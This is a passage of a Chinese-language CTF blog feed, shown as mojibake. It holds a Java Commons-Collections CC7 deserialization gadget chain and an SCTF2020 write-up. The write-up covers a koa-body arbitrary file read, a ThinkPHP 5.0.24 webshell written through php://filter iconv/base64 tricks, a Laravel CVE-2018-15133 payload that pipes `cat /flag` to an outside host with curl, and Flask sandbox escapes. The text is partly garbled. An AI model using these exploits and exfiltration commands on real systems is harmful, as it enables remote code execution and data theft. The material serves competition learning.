top.bycsec;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Hashtable;public class cc7 {    public static void main(String[] args) throws Exception {        Transformer[] transformers = new Transformer[]{                new ConstantTransformer(java.lang.Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}),                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),                new InvokerTransformer(&quot;exec&quot;, new Class[]{String[].class}, new Object[]{new String[]{&quot;calc&quot;}}),        };        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap innerMap1 = new HashMap&lt;String, String&gt;();        innerMap1.put(&quot;yy&quot;, &quot;1&quot;); // &quot;yy&quot;.hashCode() == &quot;zZ&quot;.hashCode() == 3872        HashMap innerMap2 = new HashMap&lt;String, String&gt;();        innerMap2.put(&quot;zZ&quot;, &quot;1&quot;);        LazyMap lazyMap1 = (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer);        LazyMap lazyMap2 = (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer);        HashMap hashMap = new HashMap();        hashMap.put(lazyMap1, &quot;placeholder&quot;);        hashMap.put(lazyMap2, &quot;placeholder&quot;);        innerMap1.remove(&quot;zZ&quot;);         Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);         field.setAccessible(true);        field.set(chainedTransformer, transformers);        try {            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;./out.bin&quot;));            oos.writeObject(hashMap);            oos.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./out.bin&quot;));            inputStream.readObject();        } catch (Exception e) {            e.printStackTrace();        }    }}</code></pre><p>è¿™é‡Œæœ‰ä¸ªç»†èŠ‚ã€‚å°±æ˜¯é¦–å…ˆéœ€è¦putä¸¤æ¬¡æ‰èƒ½è°ƒç”¨equalsæ–¹æ³•ã€‚<br>ç„¶åç”±äºä¸€ä¸ªå°bug</p><pre><code class="java">&quot;yy&quot;.hashCode() == &quot;zZ&quot;.hashCode()</code></pre><p>ä¼šå¯¼è‡´â€ç¢°æ’â€å‘ç”Ÿï¼Œå…¶å®å°±æ˜¯å› ä¸ºè¿™æ ·è®¡ç®—å‡ºæ¥çš„hashä¸€è‡´æ‰€ä»¥ä¼šå¯¼è‡´å®ƒè°ƒç”¨å…¶ä¸­ä¸€ä¸ªå¯¹è±¡çš„equalsæ–¹æ³•è¿›è¡Œæ¯”è¾ƒã€‚è¿™æ ·å°±èƒ½æˆåŠŸè¿›å…¥æˆ‘ä»¬çš„gadgetäº†ã€‚æœ€åexpremoveæ‰zZè¿™ç¬¬äºŒä¸ªå…ƒç´ ã€‚è¿™æ˜¯è¦å»æ‰è¿™ä¸ªé”®ã€‚å¦åˆ™è¿™ä¸ªhashmapä¼šå¸¦ä¸Šæ— æ³•åºåˆ—åŒ–çš„å¯¹è±¡ä»è€Œä½¿ååºåˆ—åŒ–å¤±è´¥ã€‚</p><ul><li>summary</li></ul><p>æ²¡æƒ³åˆ°æœ€åè¿˜æ˜¯æˆåŠŸæŠŠé“¾å­éƒ½è·Ÿå®Œäº†ã€‚è¿™ç¯‡æ–‡ç« å°±å†™è¿™ä¹ˆå¤šäº†ã€‚ååºåˆ—åŒ–çš„gadgetè·Ÿè¿›è¯´å®è¯æ¯”èµ·phpå°‘äº†ä¸€ç‚¹å˜é€šï¼Œä½†æ˜¯éš¾åº¦è¿˜æ˜¯æœ‰ç‚¹å¤§çš„ã€‚ä¸è¿‡æ•´ä½“ä¸‹æ¥ä¸éš¾å‘ç°Mapç±»,ccåº“ä¸­çš„ä¸€ç³»åˆ—Transformerç±»ï¼Œåå°„çš„æŠ€å·§èµ·åˆ°äº†è‡³å…³é‡è¦çš„ä½œç”¨ã€‚å¹¶ä¸”å®é™…ä¸Šè‚¯å®šå­˜åœ¨æ›´å¤šgadgetç­‰å¾…å‘æ˜ã€‚</p><p>åé¢ä¼šæŠ½ç©ºå»å­¦ä¹ ä¸‹shiro,jackson,fastjsonç­‰ç­‰çš„æ·±åº¦åˆ†æã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF2020 writeup</title>
      <link href="2020/07/05/SCTF2020-writeup/"/>
      <url>2020/07/05/SCTF2020-writeup/</url>
      
        <content type="html"><![CDATA[<p>è¶Šæ‰“è¶Šèœ :(<br>è¿™æ¬¡æ¯”èµ›éš¾åº¦ç›¸æ¯”ä¸Šæ¬¡RCTFçš„éš¾åº¦å¥½äº†ç‚¹ã€‚ä½†æ˜¯æœ€åè¿˜æ˜¯åªèƒ½æ„Ÿæ…¨è‡ªå·±tclã€‚åšå‡ºæ¥çš„åªæœ‰CloudDiskè·ŸUnsafeDefenseSystem.ç›¸æ¯”ä¸‹solveæ¯”è¾ƒå¤šçš„pythonsandboxè‡ªå·±åè€Œå› ä¸ºæ€»è§‰å¾—pyjailå¤ªè€å¥—ä¸å»ç ”ç©¶,è¿ä¸‹æ‰‹éƒ½åšä¸åˆ°â€¦â€¦èµ›åè¿˜æ˜¯æŠŠèƒ½å¤ç°çš„éƒ½å¤ç°ä¸‹å§ã€‚</p><a id="more"></a><h1 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h1><p>Nodejsç»å…¸æ¼æ´ã€‚å…¶å®å› ä¸ºæœ€è¿‘ç»ƒæ‰‹å‡ºäº†äº›Nodejsçš„é¢˜ç›®,ç°åœ¨æ„Ÿè§‰Nodeå†™èµ·æ¥å·¨èˆ’æœ,ä¼°è®¡æš‘å‡ä¼šé•¿æœŸç»ƒæ‰‹ä¸€äº›nodeé¡¹ç›®ã€‚</p><p>é¦–å…ˆå…ˆä¸è¯´é¢˜ç›®æœ¬èº«,å•ä»æœ€è¿‘å†™nodejsåº”ç”¨expresså…¥æ‰‹ï¼Œå‘ç°expressæ¡†æ¶ä¸€ä¸ªå¯ç”¨æ”¯æŒæ•°æ®çš„å†™æ³•ï¼š</p><pre><code class="javascript">const bodyParser = require(&#39;body-parser&#39;);app.use(express.json());app.use(express.urlencoded({ extended: false }));</code></pre><p>è¿™é‡Œæ˜¯è¡¨ç¤ºæˆ‘ä»¬çš„åº”ç”¨æ”¯æŒ<code>application/json</code>è·Ÿ<code>application/x-www-form-urlencoded</code>ä¼ è¾“çš„æ•°æ®.ç›¸ä¿¡åœ¨poståŒ…æ—¶è§è¿‡ä¸å°‘æ¬¡äº†ã€‚è€Œè®©æˆ‘æ³¨æ„åˆ°è¿™ä¸ªé—®é¢˜çš„èµ·å› æ˜¯åœ¨ä¸€æ¬¡CTFæ¯”èµ›ä¸­ã€‚æœ¬æ¥é‚£é¢˜æ˜¯Nodejsååºåˆ—åŒ–ä½œä¸ºè€ƒç‚¹ï¼Œä½†æ˜¯æˆ‘å¼€å§‹åœ¨éšæ„æµ‹è¯•æ—¶å‘ç°äº†å¦ä¸€ä¸ªæ¼æ´ï¼Œä¸è¿‡å› ä¸ºä¸æ˜¯æ­£ç¡®æ€è·¯å°±æ²¡æ·±å…¥ã€‚åæ¥getshellæ—¶æŠŠæºç æ‹¿ä¸‹æ¥ä»”ç»†é˜…è¯»ï¼Œå‘ç°é—®é¢˜å°±æ˜¯å‡ºåœ¨è¿™ä¸Šé¢ã€‚å¯¹äºNodejsè€Œè¨€,ä¼ è¾“jsonæ•°æ®æ˜¯éå¸¸å±é™©çš„ä¸€ä»¶äº‹ã€‚å› ä¸ºNodejsæœ¬èº«å°±æ˜¯jsçš„ä¸€ä¸ªruntimeç¯å¢ƒ,javascriptçš„å¯¹è±¡å†™æ³•å°±æ˜¯<code>{&quot;sth&quot;:&quot;byc&quot;}</code>ä¹‹ç±»çš„ã€‚è€Œjsonæ•°æ®ä¸è¿™çš„æ ¼å¼ä¸€è‡´æ€§å¾€å¾€å¯¼è‡´ä¼ è¾“çš„æ•°æ®ä¼šè¢«è¿›è¡Œæ··æ·†ã€‚ä¸€æ—¦ç¨‹åºå†™æ³•æœ‰äº†é—®é¢˜ï¼Œå°±å¯èƒ½è¯¯å–æŸä¸ªç”¨æˆ·ä¼ è¾“çš„å€¼ä½œä¸ºå¯¹è±¡çš„å±æ€§ï¼Œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“ï¼Œå˜é‡æ··æ·†ï¼ŒNosqlæ³¨å…¥ä¹‹ç±»çš„ã€‚</p><p>å›åˆ°é¢˜ç›®ã€‚ç”±äºæœ‰æºç ,æ‰€ä»¥ç›´æ¥ä¸Šæ‰‹åˆ†æã€‚å½“ç„¶ç”±äºNodejsçš„ç‰¹æ€§ï¼Œä»¥åŠæœ¬é¢˜æ‰€æ‰§è¡Œçš„ä¸Šä¼ ä¸‹è½½çš„è¿‡ç¨‹,åœ¨ä¾èµ–æ­£å¸¸çš„æƒ…å†µä¸‹ä¸å¯èƒ½å‡ºç°æ³¨å…¥ï¼Œè·¯å¾„ç©¿è¶Šä¹‹ç±»çš„é—®é¢˜ã€‚åªå¯èƒ½æ˜¯æ–‡ä»¶è¯»å–äº†ã€‚é‚£ä¹ˆé—®é¢˜å‡ºåœ¨å“ªå‘¢</p><pre><code class="javascript">const file = ctx.request.body.files.file;const reader = fs.createReadStream(file.path);...const upStream = fs.createWriteStream(filePath);</code></pre><p>æ³¨æ„è¿™é‡Œ,å®ƒçš„å–å€¼æ˜¯ä»ctx.request.bodyä¸­å–çš„ã€‚è€Œè¿™å°±æœ‰å¯èƒ½å‡ºç°ä¸Šé¢æåˆ°çš„é—®é¢˜ã€‚å‡å¦‚æˆ‘ä»¬ä¼ è¾“jsonæ•°æ®fileså¹¶ç½®å…¶pathå±æ€§ä¸ºä»»æ„æ–‡ä»¶ã€‚æˆ‘ä»¬ä¹‹åä¸‹è½½çš„æ–‡ä»¶å°±æ˜¯æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶äº†ã€‚</p><p>æ•…è¯»å–ä¹‹</p><pre><code class="json">{&quot;files&quot;:{&quot;file&quot;:{&quot;path&quot;:&quot;/app/flag&quot;}}}</code></pre><p><img src="/2020/07/05/SCTF2020-writeup/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>åæ¥æ ¹æ®é˜Ÿå‹æ•™çš„åº”è¯¥æ˜¯ä¸ªkoa-bodyçš„é—®é¢˜ã€‚éš¾æ€ªæˆ‘æœ¬åœ°å½“æ—¶è¿ä¸Šä¼ éƒ½è·‘ä¸èµ·æ¥ã€‚å› ä¸ºæ˜¯ä¸ª2.xç‰ˆæœ¬çš„koa.å‡ºé¢˜äººä¸ç»™package.jsonä¼°è®¡æ˜¯æ€•ä¸€çœ¼çœ‹å‡ºç‰ˆæœ¬é—®é¢˜å§ã€‚</p><h1 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h1><p>è¯´çœŸçš„ã€‚è¿™é¢˜è¿™æ¬¡çœŸçš„æ˜¯å¿ƒæ€èµ·ä¼æœ€å¤§çš„ä¸€é¢˜ã€‚è¯´å®è¯æˆ‘ä»¬æœ¬æ¥æœ‰æ‹¿ä¸‹ä¸€è¡€çš„æœºä¼šçš„ã€‚ç»“æœå› ä¸ºå°ç»†èŠ‚å°±å¯¼è‡´è‡ªå·±æµªè´¹äº†æ•°ä¸ªå°æ—¶ã€‚ç¬¬ä¸€å¤©æ™šä¸Š9ç‚¹å·¦å³æˆ‘ä»¬å°±å·²ç»åœ¨æ‰“tp5.0.24çš„ååºåˆ—åŒ–äº†ã€‚ç»“æœä¸€ç›´å°±ä»¥å¤±è´¥å‘Šç»ˆ,ç¬¬äºŒå¤©æ‰ç»ˆäºæ˜ç™½é—®é¢˜ä¸æ˜¯å‡ºåœ¨expä¸Š.å…·ä½“åé¢å†è¯´å§ã€‚</p><p>è€å®è¯´è¿™é¢˜æ•´ä½“è„‰ç»œä¸‹æ¥è·Ÿæˆ‘å¹³æ—¶æ¸—é€çš„æ€è·¯å¾ˆç›¸ä¼¼ï¼Œæ‰€ä»¥åœ¨å‰é¢è¿›åº¦éå¸¸é¡ºåˆ©ï¼Œæ²¡æœ‰å¡å£³ã€‚</p><p>ç¬¬ä¸€æ­¥æ˜¯è®¿é—®ç½‘å€ã€‚å‘ç°ä½œäº†ä¸ªè·³è½¬ã€‚åŒæ—¶æé†’äº†<strong>log.txt</strong>çš„å­˜åœ¨.(å°±æ˜¯å› ä¸ºæˆ‘çœ‹æ‰äº†log.txtå¯¼è‡´åé¢æµªè´¹çš„å·¨é‡æ—¶é—´ï¼Œè¯¥æ‰“)</p><p>å› ä¸ºè·³è½¬åˆ°<code>/public/test</code>ã€‚æ‰€ä»¥ç›´æ¥è®¿é—®è¿™ä¸ªè·¯ç”±ã€‚å¾—åˆ°ä¸€ä¸ªç½‘é¡µã€‚éšä¾¿ç‚¹ç‚¹åä¼¼ä¹æ˜¯é™æ€çš„ã€‚è¿™æ—¶å€™æœæ–­åˆ‡ctrl+uçœ‹æºç ,å¹¶ä¸”ctrl+fæœç´¢phpã€‚çœ‹æœ‰æ²¡æœ‰åŠ¨æ€æ–‡ä»¶å­˜åœ¨ã€‚<br>æœç„¶åœ¨æ³¨é‡Šä¸­æ‰¾åˆ°äº†ã€‚</p><pre><code class="html"> &lt;!-- Admin:/public/nationalsb/login.php --&gt;</code></pre><p>è®¿é—®åå‘ç°æ˜¯ä¸ªauthçš„ç™»å½•ã€‚ä½†æ˜¯ä»»æ„ç”¨æˆ·å¯†ç éƒ½èƒ½è¿›ã€‚ä¸è¿‡æ¯•ç«Ÿæˆ‘ä»¬æ”¶è·äº†ä¸€ä¸ªæ–°è·¯ç”±<code>/public/nationalsb/</code>æœæ–­å»è¿™çœ‹çœ‹ã€‚</p><p>åŒæ ·è¿˜æ˜¯ç›´æ¥çœ‹ç½‘é¡µæºç ,å‘ç°åŠŸèƒ½åˆæ˜¯ä¸ªé™æ€çš„ã€‚ä½†æ˜¯æœ‰ä¸ªjsæ–‡ä»¶ã€‚ç‚¹è¿›å»æ”¶è·æç¤ºã€‚</p><pre><code class="html">/username:Admin1964752//password:DsaPPPP!@#amspe****//Secret **** is your birthday</code></pre><p>æ˜¾ç„¶å¯†ç åå››ä½è¦çˆ†ç ´ã€‚éšä¾¿å†™ä¸ªè„šæœ¬å‡ºåå››ä½å¥½äº†ã€‚è¿™ç§çˆ†ç ´é‡ç›¸æ¯”ä¹‹å‰hacktheboxçš„é‡å·²ç»éå¸¸å‹å¥½ã€‚</p><p>æœ€åçˆ†å‡ºå¯†ç åç¼€1221.ç™»å½•æ—¶çš„å†…å®¹æç¤ºæˆ‘ä»¬å¯ä»¥postfile.å®éªŒåæ˜¯ä¸ªlfi.ä¸è¿‡æ˜¾ç„¶åšäº†å¤„ç†ï¼Œä¸èƒ½è¯»å–<code>/flag</code>è·Ÿå¸¦æœ‰logçš„(è¿™é‡Œæˆ‘ä»¥ä¸ºæ˜¯banäº†login,ä½†åæ¥å‘ç°æ˜¯banäº†logâ€¦).é‚£ä¹ˆåŸºäºè¿™æ˜¯ä¸ªtp5.0.24.æœæ–­dumpæºç å¥½äº†</p><p>ç°åœºä¸‹äº†ä¸ªtp5.0.24çš„æºç ã€‚æœ€é‡è¦çš„è‚¯å®šæ˜¯æ§åˆ¶å™¨æºç ã€‚æ‰€ä»¥è¯»å–<code>application/index/controller/Index.php</code></p><pre><code class="php">&lt;?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ?&gt;#r=requests.get(un_url+tmp_unserialize_payload)r=requests.get(un_url+unserialize_payload)r=requests.post(&#39;http://39.99.41.124/public/3b58a9545013e88c7186db11bb158c44.php&#39;,data={    &#39;ccc&#39;:&quot;system(&#39;cat /flag&#39;);&quot;})print(r.text)</code></pre><p>æœ€åå†å›è¿‡å¤´è§£é‡Šä¸‹ä½¿ç”¨è¿‡æ»¤å™¨çš„åŸå› å§ã€‚å› ä¸ºä¹‹å‰éƒå¸ˆå‚…å®æˆ˜ä¸­é‡åˆ°äº†ï¼Œæ‰€ä»¥æœ‰è¿™ä¸¤ä¸ªå‘ç‚¹</p><ul><li>short open tag<pre><code>&lt;?cuc//000000000000rkvg();?&gt;æŠ¥é”™ Parse error: syntax error, unexpected &#39;rkvg&#39; (T_STRING)</code></pre>å› ä¸ºé»˜è®¤æ”¯æŒçŸ­æ ‡ç­¾çš„åŸå› ï¼Œç”±äº &lt;?cucï¼Œä¹Ÿå°±æ˜¯ &lt;?åé¢å‡ºç°äº† cuc å­—ç¬¦ä¸²ï¼Œä½¿å¾—ä»£ç è¯­æ³•ä¸åˆæ ¼ï¼Œphp æŠ¥é”™é€€å‡ºæ‰§è¡Œã€‚</li></ul><p>å› æ­¤,è¦ç´ å…¶å®å°±æ˜¯ç»•è¿‡è¿™ä¸ªexit()ã€‚è¦æƒ³<code>&lt;,?</code>ä¸è¢«è¯†åˆ«ã€‚æˆ‘ä»¬å¯ä»¥ç”¨string.strip_tagsè¿‡æ»¤å™¨æ¥è§£å†³ã€‚ä½†æ˜¯è¦è®©shellä»£ç <code>&lt;?php eval(xxx)</code>ä¸è¢«è¿‡æ»¤ã€‚æˆ‘ä»¬å¯ä»¥ç”¨convert.base64-decodeè¿‡æ»¤å™¨æ¥è§£å†³ã€‚æ‰€ä»¥è¦ç´ å°±æ˜¯ä¸¤ç§è¿‡æ»¤å™¨æ­é…ã€‚ä½†æ˜¯è¿™é‡Œéœ€è¦è§£å†³çš„æœ€é‡è¦çš„é—®é¢˜ï¼Œå°±æ˜¯base64è§£é‡Šå™¨é‡åˆ°ç­‰å·å°±ç›´æ¥ç»“æŸäº†ã€‚æ‰€ä»¥è¿˜è¦æƒ³åŠæ³•è®©æ–‡ä»¶åä¸­ä¸å‡ºç°<code>=</code>.</p><p>è¿™é‡Œå°±å¯ä»¥ä½¿ç”¨phpé»˜è®¤æ”¯æŒçš„iconvè¿‡æ»¤å™¨ã€‚ä¼˜åŠ¿åœ¨äºï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨iconvè¿™ä¸ªshellå‘½ä»¤æ”¯æŒçš„æ‰€æœ‰ç¼–ç è¿›è¡Œè½¬æ¢ã€‚<br>è€Œä¹‹å‰æˆ‘ä»¬åœ¨å„ç§æ¯”èµ›ä¸­åº”è¯¥ä¹Ÿæ¥è§¦è¿‡è½¬ç ä¸ºutf-7çš„webshelläº†ã€‚æ¯”å¦‚XNUCA</p><pre><code>&lt;?php$cc=&#39;php://filter/convert.iconv.utf-8.utf-7/resource=123.txt&#39;;file_put_contents($cc,&#39;=&#39;);/**123.txt å†™å…¥çš„å†…å®¹ä¸º: +AD0-**/</code></pre><p>+AD0-å¯ä»¥è¢«base64è¿‡æ»¤å™¨è§£ç ,æ‰€ä»¥è¯´æˆ‘ä»¬å°±èƒ½æˆåŠŸå†™å…¥shelläº†ã€‚</p><pre><code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../</code></pre><p>è€Œä¸”ç”Ÿæˆçš„æ–‡ä»¶åä¸ä¼šåƒrot13é‚£æ ·æœ‰å¥‡æ€ªçš„å‰ç¼€ã€‚æˆ‘ä»¬ç›´æ¥å¾—åˆ°md5ä½œä¸ºæ–‡ä»¶åçš„phpã€‚(å€¼å–å†³äºä½ çš„fileç±»ä¸­çš„$tagå€¼,å¾ˆå¤šexpé‡Œå°±æ˜¯true.æ‰€ä»¥ç®—md5(â€˜tag_â€™+md5(â€˜1â€™))å°±è¡Œäº†)</p><p>å½“ç„¶å› ä¸ºbase64æ˜¯8byteè§£ç ã€‚å®é™…éœ€è¦æ ¹æ®è‡ªå·±çš„payloadè¡¥è¶³a.å½“ç„¶æœ€å¤šè¡¥è¶³4ä¸ªå°±è¡Œã€‚æ‰€ä»¥FUZZä¸‹å°±èƒ½è§£å†³é—®é¢˜<br><img src="/2020/07/05/SCTF2020-writeup/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‰€ä»¥è¯´çœŸçš„æ‹‰èƒ¯ã€‚è¿˜é ç€éƒå¸ˆå‚…çš„è€æœ¬ä»¥ä¸ºå å°½å…ˆæœºã€‚å´å› ä¸ºä¸€äº›å°ç»†èŠ‚èµ°å…¥è¯¯åŒºã€‚å¯èƒ½è¿™å°±æ˜¯æ¸—é€å§ã€‚</p><h1 id="bestlanguage"><a href="#bestlanguage" class="headerlink" title="bestlanguage"></a>bestlanguage</h1><p>æˆ‘è¦æ˜¯å®¡è¿‡laravel5.8RCEä»¥å¤–çš„é“¾å­ä¼šæ˜¯è¿™ä¸ªåŠæ ·.jpgâ€¦..ç¬¬äº”ç©ºé—´çš„laravelå› ä¸ºå®¡è¿‡é“¾å­æ‰€ä»¥ç›´æ¥ç§’äº†ã€‚è¿™ä¸ªå› ä¸ºæ²¡å®¡è¿‡çœ‹éƒ½æ²¡çœ‹æ‡‚,å±å®æ‹‰èƒ¯ã€‚</p><p>å…¶å®å°±æ˜¯CVE-2018-15133.å› ä¸º.envé‡Œç»™äº†keyæ‰€ä»¥å°±èƒ½ç›´æ¥æ‰“ã€‚<br>payloadå¯ä»¥ç”¨ç¬¬äº”ç©ºé—´çš„payloadã€‚å› ä¸ºä»¥å‰åœ¨phpæ¡†æ¶ç»ƒä¹ ä¸­æŠ¤ç½‘æ¯çš„éé¢„æœŸé‡Œæè¿‡è¿™ä¸ªé“¾å­äº†ã€‚æ‰€ä»¥å°±ä¸æ·±è°ˆäº†ã€‚ç„¶åç¬¬äº”ç©ºé—´å°±æ˜¯æ”¹äº†ä¸€ä¸ªç±»çš„destructã€‚æ¢äº†å¦ä¸€ä¸ªç±»çš„destructè¿˜èƒ½è§¦å‘__getã€‚è¿™é‡Œå¯ä»¥ç”¨ä¸¤ä¸ªç±»éƒ½èƒ½ç”¨ã€‚</p><p>payloadç”¨ggcç”ŸæˆæŒºçœäº‹çš„ã€‚å½“ç„¶ç›´æ¥ç”¨ä¹‹å‰rceexpçš„ä¹Ÿå¯ä»¥</p><pre><code>O:40:&quot;Illuminate\Broadcasting\PendingBroadcast&quot;:2:{s:9:&quot;*events&quot;;O:28:&quot;Illuminate\Events\Dispatcher&quot;:1:{s:12:&quot;*listeners&quot;;a:1:{s:28:&quot;curl 120.27.246.202/`whoami`&quot;;a:1:{i:0;s:6:&quot;system&quot;;}}}s:8:&quot;*event&quot;;s:28:&quot;curl xxxxx/`cat /flag`&quot;;}</code></pre><p>base64åè”åˆkeyé€ç»™æŸcvephpå³å¯ã€‚å½“ç„¶ä¹Ÿèƒ½ç›´æ¥è°ƒç”¨ç”Ÿæˆã€‚<br>å…¶ä»–æˆ˜é˜Ÿå¤§ä½¬çš„wpå†™çš„è‚¯å®šæ¯”æˆ‘å¥½ã€‚æˆ‘å°±ä¸æ”¾expäº†ã€‚</p><p><img src="/2020/07/05/SCTF2020-writeup/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>çœ‹åˆ°é¢„æœŸè§£æ˜¯é€šè¿‡è¦†ç›–sessionååºåˆ—åŒ–ã€‚è¿™å°±èƒ½è§£é‡Šindexçš„è·¯ç”±è®¾ç½®äº†ã€‚å¯æƒœäº†æœ¬æ¥ä¸€ä¸ªå¾ˆéš¾ç»•è¿‡çš„é¢˜éƒ½è¢«å¤§å®¶åˆ©ç”¨æ¡†æ¶çš„æ´æ‰“æˆRCEäº†â€¦â€¦</p><h1 id="pysandbox-1-amp-2"><a href="#pysandbox-1-amp-2" class="headerlink" title="pysandbox 1&amp;2"></a>pysandbox 1&amp;2</h1><p>é¢˜ç›®è™½ç„¶æ˜¯æ²™ç›’é€ƒé€¸ã€‚ä½†å…¶å®ç”¨çš„expè‡ªå·±ä¹‹å‰ä¹Ÿç”¨è¿‡.çœ‹å®˜æ–¹wpç”¨çš„å½“åˆtokyowesternçš„è„šæœ¬å€’æ˜¯æŒºæƒŠè®¶çš„ã€‚å› ä¸ºè‡ªå·±å‰ä¸ä¹…åšå®‰æ’æ¯”èµ›æ—¶ä¹Ÿç”¨è¿‡shrineé‚£é¢˜çš„è„šæœ¬ã€‚æ€»ä¹‹å°±æ˜¯èƒ½ç›´æ¥fuzzå‡ºä¸€æ¡ç»§æ‰¿é“¾ï¼Œç›¸å½“å¥½ç”¨ã€‚</p><p>å…ˆæ¥å­¦ä¹ ä¸‹dalaoä»¬çš„è®¾ç½®é™æ€ç›®å½•çš„åšæ³•</p><pre><code>/?POST=%2fcmd=app.static_folder=request.args[request.method]</code></pre><p>è®¾ç½®é™æ€ç›®å½•ä¸º<code>/</code><br>ä¹‹åå³å¯è®¿é—®<code>static/flag</code><br><img src="/2020/07/05/SCTF2020-writeup/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç„¶åå°±æ˜¯RCEäº†ã€‚è¿™é‡Œå…¶å®è‡ªå·±ä¹‹å‰FUZZè¿‡ä¸€æ¬¡ã€‚å°±æ˜¯ç”¨shrineé‚£ä¸ªè„šæœ¬fuzzå‡ºä¸€æ¡è·å–appçš„é“¾ã€‚</p><p>å½“ç„¶è¿™é‡Œçœ‹åˆ°ä¸€ä¸ªå¾ˆç®€å•çš„æ–¹æ³•ã€‚åˆ†äº«ä¸‹W4nderå¸ˆå‚…çš„<br><a href="http://phoebe233.cn/index.php/archives/53/#pysandbox2" target="_blank" rel="noopener">http://phoebe233.cn/index.php/archives/53/#pysandbox2</a><br>å› ä¸ºordæ˜¯åœ¨builtinsé‡Œçš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è¦†ç›–ã€‚ä¹‹ååŒç†å†è¦†ç›–æ‰è·¯ç”±å‡½æ•°ã€‚åˆ©ç”¨lambdaåŒ¿åå‡½æ•°ã€‚éå¸¸å·§å¦™ã€‚<br><img src="/2020/07/05/SCTF2020-writeup/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 